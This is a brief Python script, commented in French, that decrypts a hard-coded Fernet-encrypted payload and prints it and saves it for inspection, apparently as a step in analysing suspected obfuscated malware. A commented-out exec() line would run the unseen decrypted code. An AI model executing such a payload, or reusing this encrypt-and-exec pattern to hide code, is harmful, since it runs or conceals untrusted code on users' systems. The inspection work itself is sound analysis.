import base64
import requests
from fernet import Fernet

# 1) Déchiffre le payload initial
key = b'0mKkGxyqdTZtwW24PAmNW-slDG-vSN-2n4gMoJlXZgU='
cipher = Fernet(key)
encrypted = b'gAAAAABoVFz7ZVmd0lAqMYurxDiRBbuEhel7KyzT8pZMoKKCNrjLi0zE5QyYzbBd8IzVHJ2UVftl6oXc51mkDKEIfH2V0zsby6C30ZpijuUWcBB0tRKZ36W_vOJhtmurbCp0ghIzDbX74oqcpBbwuzPZRv7wMMkm1_DKxLnIaGcQjeytaYOVp9PzO4aYuhm2rm0WmpXUFs8yscyucOFp8lcPkX4Xg8LowuDrUB_1tcdxVZpCNQr4zvo='
payload_code = cipher.decrypt(encrypted).decode('utf-8')

# 2) Sauvegarde ou affiche-le pour inspection
print("=== DECRYPTED PAYLOAD ===\n")
print(payload_code)
# Optionnel : écris dans un fichier
with open('decrypted_payload.py', 'w', encoding='utf-8') as f:
    f.write(payload_code)

# 3) STOP ici – ne pas exec() tant que tu n’as pas inspecté !
# exec(payload_code)
